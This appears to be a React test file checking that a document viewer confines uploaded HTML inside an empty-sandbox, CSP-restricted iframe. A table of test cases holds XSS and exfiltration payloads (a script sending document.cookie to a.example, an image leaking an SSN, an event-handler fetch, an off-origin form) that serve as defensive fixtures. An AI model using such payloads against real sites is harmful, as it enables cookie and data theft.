import { readdirSync, readFileSync } from 'node:fs';
import { join, relative, sep } from 'node:path';
import { render, screen } from '@testing-library/react';
import type { DocumentContentInfo } from '../graphql/client';
import { DocumentViewer, VIEWER_CSP, VIEWER_SANDBOX } from './DocumentViewer';

/**
 * The viewer is the M12 half of what `MessageText` is for model output, so its
 * spec is written the same way: as an attack list, where each case is content
 * somebody could get in front of a reader (a scanned deed, a title they wrote,
 * a rendered instrument carrying their own words) and the assertion is about
 * what the browser is allowed to do with it.
 *
 * The difference from MessageText is deliberate and is the thing to keep
 * honest: a document CANNOT render as text nodes and still be a document, so
 * the control here is containment rather than absence. Which makes the sandbox
 * value itself the security parameter — hence an exact-match assertion on it
 * rather than a substring, because `allow-scripts allow-same-origin` also
 * contains "allow-scripts" and is the combination that undoes everything.
 */

const HTML_CONTENT: DocumentContentInfo = {
  documentId: 'd0000000-0000-4000-8000-00000000000d',
  version: 2,
  mime: 'text/html',
  contentSha256: 'a'.repeat(64),
  encoding: 'utf8',
  content: '<!doctype html><html><body><h1>Last Will</h1></body></html>',
};

function frameOf(container: HTMLElement): HTMLIFrameElement {
  const frame = container.querySelector('iframe');
  expect(frame).not.toBeNull();
  return frame as HTMLIFrameElement;
}

describe('containment', () => {
  it('renders the content into a frame and never into this app’s DOM', () => {
    const { container } = render(<DocumentViewer content={HTML_CONTENT} />);
    const frame = frameOf(container);
    expect(frame.getAttribute('srcdoc')).toBe(HTML_CONTENT.content);
    // The document's own markup exists ONLY as the srcdoc string. Nothing was
    // parsed into the page: no heading from the instrument, no stray element.
    expect(container.querySelector('h1')).toBeNull();
    expect(container.textContent).not.toContain('Last Will');
  });

  it('grants the frame NOTHING — the sandbox attribute is empty', () => {
    const { container } = render(<DocumentViewer content={HTML_CONTENT} />);
    const frame = frameOf(container);
    // Present, and exactly empty. No scripts, no same-origin, no forms, no
    // popups, no top-level navigation.
    expect(frame.hasAttribute('sandbox')).toBe(true);
    expect(frame.getAttribute('sandbox')).toBe('');
    expect(VIEWER_SANDBOX).toBe('');
  });

  it('carries the per-frame csp attribute as a third layer', () => {
    const { container } = render(<DocumentViewer content={HTML_CONTENT} />);
    expect(frameOf(container).getAttribute('csp')).toBe(VIEWER_CSP);
    // No network reachable from inside, whatever the document asks for.
    expect(VIEWER_CSP).toContain("default-src 'none'");
  });

  it.each([
    [
      'a remote image — the exfiltration payload docs/03 §6d names',
      '<img src="https://a.example/?d=ssn">',
    ],
    ['an inline script', '<script>fetch("https://a.example/?c="+document.cookie)</script>'],
    ['an event handler', '<div onmouseover="fetch(\'https://a.example\')">hover</div>'],
    ['a form posting off-origin', '<form action="https://a.example"><input name="ssn"></form>'],
    ['a frame-busting navigation', '<a href="https://a.example" target="_top">go</a>'],
    ['an object embed', '<object data="https://a.example/x.swf"></object>'],
  ])('keeps %s inside the frame, out of the page', (_name, payload) => {
    const { container } = render(
      <DocumentViewer
        content={{ ...HTML_CONTENT, content: `<html><body>${payload}</body></html>` }}
      />,
    );
    // Exactly one element that can make a request — the sandboxed frame itself.
    for (const tag of ['a', 'img', 'script', 'link', 'object', 'embed', 'form', 'video']) {
      expect(container.querySelectorAll(tag)).toHaveLength(0);
    }
    expect(container.querySelectorAll('iframe')).toHaveLength(1);
  });
});

describe('what is NOT framed', () => {
  it.each([
    ['a PDF upload', { mime: 'application/pdf', encoding: 'base64' as const }],
    ['a scanned image', { mime: 'image/png', encoding: 'base64' as const }],
    // Defence against the invariant being wrong rather than against a case that
    // exists: the ingest pipeline's magic-byte sniff admits pdf/png/jpeg/tiff
    // only, so an uploaded text/html is unreachable today — this component
    // still refuses to trust that from a distance.
    ['HTML claiming to be base64', { mime: 'text/html', encoding: 'base64' as const }],
    ['a utf8 body that is not HTML', { mime: 'text/plain', encoding: 'utf8' as const }],
  ])('refuses to frame %s', (_name, overrides) => {
    const { container } = render(
      <DocumentViewer content={{ ...HTML_CONTENT, ...overrides, content: 'JVBERi0=' }} />,
    );
    expect(container.querySelectorAll('iframe')).toHaveLength(0);
    expect(screen.getByText(/can’t be shown here yet/i)).toBeInTheDocument();
  });

  it('does not echo the unshowable content itself', () => {
    const { container } = render(
      <DocumentViewer
        content={{
          ...HTML_CONTENT,
          mime: 'application/pdf',
          encoding: 'base64',
          content: 'SECRETBASE64PAYLOAD',
        }}
      />,
    );
    expect(container.textContent).not.toContain('SECRETBASE64PAYLOAD');
  });
});

/**
 * `dangerouslySetInnerHTML` is already fenced app-wide by MessageText's own
 * spec, which scans every source file and allows exactly `app/layout.tsx`. This
 * is the fence M12 adds alongside it: THE FRAME ITSELF.
 *
 * A second `<iframe>` somewhere else in the app — added for a preview, an
 * embed, a help panel — would reopen the channel this component exists to
 * close, and it would do so from a file nobody thought of as a renderer. So the
 * viewer is asserted to be the only source of one, in the credential-graph
 * habit of stating the exception as data rather than as a convention.
 */
const IFRAME_ALLOWED = ['components/DocumentViewer.tsx'];

function sourceFiles(dir: string): string[] {
  return readdirSync(dir, { withFileTypes: true }).flatMap((entry) => {
    const path = join(dir, entry.name);
    if (entry.isDirectory()) return sourceFiles(path);
    // Type declarations render nothing, so they are not a place a frame can
    // come from — and one of them documents the `csp` attribute in prose.
    const source =
      entry.isFile() &&
      /\.tsx?$/.test(entry.name) &&
      !/\.test\.tsx?$/.test(entry.name) &&
      !entry.name.endsWith('.d.ts');
    return source ? [path] : [];
  });
}

describe('the sandboxed frame is the only frame', () => {
  it('renders an iframe in exactly the one declared place', () => {
    const root = join(__dirname, '..');
    const files = sourceFiles(root);
    expect(files.length).toBeGreaterThan(15);
    const users = files
      .filter((file) => /<iframe[\s>]/.test(readFileSync(file, 'utf8')))
      .map((file) => relative(root, file).split(sep).join('/'));
    expect(users.sort()).toEqual(IFRAME_ALLOWED);
  });
});
